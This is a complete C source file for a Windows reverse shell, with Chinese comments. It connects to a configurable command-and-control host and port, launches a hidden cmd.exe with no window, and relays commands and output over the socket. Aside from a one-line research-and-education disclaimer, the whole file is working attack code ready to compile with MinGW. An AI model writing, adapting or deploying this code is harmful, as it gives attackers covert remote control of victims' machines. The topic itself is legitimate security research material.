/**
 * Reverse Shell with socket() + Pipe
 * 使用 socket() 和管道方案实现反弹 shell
 * 不依赖 VS 特有头文件，可用 mingw 编译
 * 
 * 仅供安全研究和教育目的使用
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <process.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "127.0.0.1"
#define C2_PORT 4444
#define BUFFER_SIZE 4096

// 全局变量，用于线程间共享
SOCKET g_sock;
HANDLE g_hChildStdinWrite;   // 写入子进程 stdin
HANDLE g_hChildStdoutRead;   // 读取子进程 stdout
volatile BOOL g_bRunning = TRUE;

// 线程函数：从 socket 读取数据，写入管道（发送给 cmd.exe）
unsigned __stdcall SocketToPipe(void* param)
{
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while (g_bRunning) {
        bytesReceived = recv(g_sock, buffer, BUFFER_SIZE, 0);
        if (bytesReceived <= 0) {
            g_bRunning = FALSE;
            break;
        }

        DWORD bytesWritten;
        if (!WriteFile(g_hChildStdinWrite, buffer, bytesReceived, &bytesWritten, NULL)) {
            g_bRunning = FALSE;
            break;
        }
    }

    return 0;
}

// 线程函数：从管道读取数据（cmd.exe 输出），发送到 socket
unsigned __stdcall PipeToSocket(void* param)
{
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;

    while (g_bRunning) {
        if (!ReadFile(g_hChildStdoutRead, buffer, BUFFER_SIZE, &bytesRead, NULL) || bytesRead == 0) {
            g_bRunning = FALSE;
            break;
        }

        int bytesSent = send(g_sock, buffer, bytesRead, 0);
        if (bytesSent <= 0) {
            g_bRunning = FALSE;
            break;
        }
    }

    return 0;
}

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    
    // 管道句柄
    HANDLE hChildStdinRead, hChildStdinWrite;
    HANDLE hChildStdoutRead, hChildStdoutWrite;
    
    char* host = C2_HOST;
    int port = C2_PORT;
    char command[] = "cmd.exe /k chcp 65001 >nul";

    // 允许通过命令行参数指定C2地址
    if (argc >= 2) {
        host = argv[1];
    }
    if (argc >= 3) {
        port = atoi(argv[2]);
    }

    // 初始化 Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // 创建 socket（使用标准 socket() 函数）
    g_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (g_sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 配置服务器地址
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    // 连接到 C2 服务器
    if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    // 设置安全属性，允许句柄继承
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // 创建 stdin 管道（C2 -> cmd.exe）
    if (!CreatePipe(&hChildStdinRead, &hChildStdinWrite, &sa, 0)) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }
    // 确保写入端不被子进程继承
    SetHandleInformation(hChildStdinWrite, HANDLE_FLAG_INHERIT, 0);

    // 创建 stdout 管道（cmd.exe -> C2）
    if (!CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &sa, 0)) {
        CloseHandle(hChildStdinRead);
        CloseHandle(hChildStdinWrite);
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }
    // 确保读取端不被子进程继承
    SetHandleInformation(hChildStdoutRead, HANDLE_FLAG_INHERIT, 0);

    // 保存到全局变量供线程使用
    g_hChildStdinWrite = hChildStdinWrite;
    g_hChildStdoutRead = hChildStdoutRead;

    // 配置 STARTUPINFO，将管道连接到子进程
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hChildStdinRead;    // 子进程从这里读取输入
    si.hStdOutput = hChildStdoutWrite; // 子进程输出到这里
    si.hStdError = hChildStdoutWrite;  // 错误也输出到这里

    memset(&pi, 0, sizeof(pi));

    // 创建 cmd.exe 进程
    if (!CreateProcessA(
        NULL,
        command,
        NULL,
        NULL,
        TRUE,           // 继承句柄
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        CloseHandle(hChildStdinRead);
        CloseHandle(hChildStdinWrite);
        CloseHandle(hChildStdoutRead);
        CloseHandle(hChildStdoutWrite);
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    // 关闭子进程端的管道句柄（父进程不需要）
    CloseHandle(hChildStdinRead);
    CloseHandle(hChildStdoutWrite);

    // 创建数据转发线程
    HANDLE hThread1 = (HANDLE)_beginthreadex(NULL, 0, SocketToPipe, NULL, 0, NULL);
    HANDLE hThread2 = (HANDLE)_beginthreadex(NULL, 0, PipeToSocket, NULL, 0, NULL);

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);
    g_bRunning = FALSE;

    // 等待线程结束
    WaitForSingleObject(hThread1, 1000);
    WaitForSingleObject(hThread2, 1000);

    // 清理
    CloseHandle(hThread1);
    CloseHandle(hThread2);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(g_hChildStdinWrite);
    CloseHandle(g_hChildStdoutRead);
    closesocket(g_sock);
    WSACleanup();

    return 0;
}
